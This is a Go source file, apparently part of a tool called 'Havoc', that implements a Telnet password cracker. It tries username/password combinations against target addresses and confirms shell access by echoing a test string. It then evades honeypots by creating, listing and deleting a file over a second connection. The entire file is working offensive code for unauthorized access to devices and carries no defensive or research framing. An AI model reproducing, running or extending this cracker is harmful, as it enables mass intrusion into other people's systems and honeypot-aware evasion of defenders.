package cracker

import (
	"Havoc/utils"
	"bytes"
	"errors"
	"net"
	"net/netip"
	"time"
)

type TelnetCracker struct {
	net.Dialer
	CheckCombo
	*utils.CPSCounter
}

func NewTelnetCracker(checkCombo CheckCombo, counter *utils.CPSCounter, timeout time.Duration) *TelnetCracker {
	return &TelnetCracker{
		Dialer: net.Dialer{
			Timeout: timeout,
		},
		CheckCombo: checkCombo,
		CPSCounter: counter,
	}
}

var (
	ErrAuth  = errors.New("invalid password")
	ErrTouch = errors.New("i can't touch some grasses that don't exist :(")
)

func (t TelnetCracker) Init() error {
	return nil
}

func (t TelnetCracker) Check(ip netip.AddrPort) (*GoodResult, error) {
	comboIterator := t.CheckCombo.Iterator()

	for comboIterator.HasNext() {
		if result, err := t.checkCombo(ip, comboIterator.Next()); err == nil {
			return result, nil
		} else if errors.Is(err, ErrConn) {
			return nil, nil
		} else {
			return nil, err
		}
	}

	return nil, nil
}

func (t TelnetCracker) checkCombo(ip netip.AddrPort, combo *Combo) (*GoodResult, error) {
	dial, err := t.Dial("tcp", ip.String())

	if err != nil {
		return nil, ErrConn
	}

	defer dial.Close()

	if !t.authenticate(dial, combo) {
		return nil, ErrAuth
	}

	if err := t.validatedConn(dial); err != nil {
		return nil, err
	}

	if err := t.checkForHonypot(dial); err != nil {
		return nil, err
	}

	return NewGoodResult(combo, "Telnet", ip), nil
}

func (t TelnetCracker) validatedConn(client net.Conn) error {
	if err := t.writeInput(client, "echo \"FuckMeHardDaddy\""); err != nil {
		return err
	}

	if t.readUnit(client, []byte("FuckMeHardDaddy"), t.Timeout) {
		return nil
	}

	return errors.New("failed to validate connection")
}

func (t TelnetCracker) checkForHonypot(client net.Conn) error {
	if err := t.createFile(client); err != nil {
		return err
	}

	dial, err := t.Dial("tcp", client.RemoteAddr().String())
	if err != nil {
		return err
	}

	defer dial.Close()

	if err := t.checkFileExists(dial); err != nil {
		return err
	}

	return nil
}

func (t TelnetCracker) createFile(client net.Conn) error {
	defer client.Close()
	if err := t.writeInput(client, "touch someGrass"); err != nil {
		return err
	}
	return nil
}

func (t TelnetCracker) checkFileExists(client net.Conn) error {
	if err := t.writeInput(client, "ls someGrass"); err != nil {
		return err
	}

	if !t.readUnit(client, []byte("someGrass"), t.Timeout) {
		return ErrTouch
	}

	_ = t.writeInput(client, "rm someGrass")
	return nil
}

func (t TelnetCracker) authenticate(client net.Conn, combo *Combo) bool {
	if !t.readUnit(client, []byte("username"), t.Timeout) {
		return false
	}

	if err := t.writeInput(client, combo.Username); err != nil {
		return false
	}

	if !t.readUnit(client, []byte("password"), t.Timeout) {
		return false
	}

	if err := t.writeInput(client, combo.Password); err != nil {
		return false
	}

	return true
}

func (t TelnetCracker) writeInput(client net.Conn, data string) error {
	_, err := client.Write([]byte(data + "\n"))
	return err
}

func (t TelnetCracker) readUnit(client net.Conn, data []byte, timeout time.Duration) bool {
	buffer := make([]byte, 1420)
	maxTime := time.Now().UTC().Add(timeout)

	if err := client.SetReadDeadline(maxTime); err != nil {
		return false
	}

	for time.Now().UTC().Before(maxTime) {
		if _, err := client.Read(buffer); err != nil {
			return false
		}

		if bytes.Contains(buffer, data) {
			return true
		}
	}

	return false
}
